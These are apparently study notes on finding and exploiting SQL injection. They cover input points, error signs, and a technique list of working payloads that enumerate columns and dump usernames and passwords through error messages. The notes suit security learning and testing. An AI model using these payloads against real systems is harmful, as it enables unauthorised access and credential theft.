## I. Find

### 1. Data entry
- Cookies
- Header: host, referer, user-agent
- Parameter in url

- Techniques: manipulate the values:
+ https://victim.com/showproducts.php?category=attacker -> Unknown value
+ https://victim.com/showproducts.php?category=boat' -> Insert single-quote
+ https://victim.com/showproducts.php?category=bi'+'ke [bi''ke, bi'||'ke] -> Encoded characters

* Root: Lack of user input sanitization.
* Solutions: Only accept digits.

### 2. Errors:
#### 2.1 Database Errors:
- Results:
+ Display and visible
+ Hidden in the Page source
+ Redirection to another page
+ Code 500 Internal Server Errror or 302.
+ Not display or display a generic error page.

#### 2.2 SQL Errors:
- MySQL
- Oracle
- PostgreSQL

### 3. Application Response
- Generic error
- HTTP Code Error: 500 or 302 (look the Location in header of 302)
- Response Size: Differ from others.

### 4. Blind Injection

## II. Confirming

## III. Automating

## IV. Techniques:
-' -> injectable?
-=asdasdasda -> injectable?
- bi''kes, bi'+'kes, bi'||'kes... -> injectable?

- ' and 1=1/@@version;-- -> It will execute and return a value of version in the error for number divide by int

- ' GROUP BY user having '1'='1';-- -> It will displays the next column like password, keep using it
- ' GROUP BY user, password having '1'='1';-- -> It will displays the next column, keep using it.
- after that, execute this to get the 1st account: ' and 1=1/user;-- or ' and 1=1/password
- or all remains account exclude the known account (exp: Admin): ' AND user NOT IN ('Admin') AND 1=1/user AND 1=1;-- -> It will iterate and displays all, because the condition is always true.

- ' AND '1'='1' LIMIT 3;-- -> Always true and limit all records to 3
- ' AND '1'='2';-- -> Always False
